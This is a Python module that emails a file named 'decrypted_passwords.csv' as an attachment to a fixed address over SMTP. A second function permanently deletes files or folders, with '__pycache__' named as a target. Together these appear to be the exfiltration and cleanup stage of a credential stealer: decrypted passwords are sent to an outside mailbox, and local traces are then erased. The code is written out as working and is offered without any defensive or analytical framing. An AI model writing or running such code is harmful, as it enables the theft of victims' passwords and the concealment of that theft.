import os
import smtplib
import shutil
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

FILE_PATH = "decrypted_passwords.csv"
CACHE_FILE = "__pycache__"

def send_mail(sender_email, sender_password):
    receiver_email = "receiver_email@example.com"
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Attachment Example"
    body = "This email contains an attached file. Date: " + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    msg.attach(MIMEText(body, 'plain'))

    with open(FILE_PATH, 'rb') as attachment_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(FILE_PATH)}"')
        msg.attach(part)
    try:
        # Replace with the appropriate SMTP server details.
        server = smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error: {e}")


def delete_file_or_folder(path):
        # Delete the specified file or folder permanently.
        try:
            if os.path.exists(path):
                if os.path.isfile(path):
                    os.remove(path)
                    print(f"File '{path}' deleted permanently.")
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                    print(f"Folder '{path}' deleted permanently.")
            else:
                print(f"Path '{path}' does not exist.")
        except Exception as e:
            print(f"Error while deleting: {e}")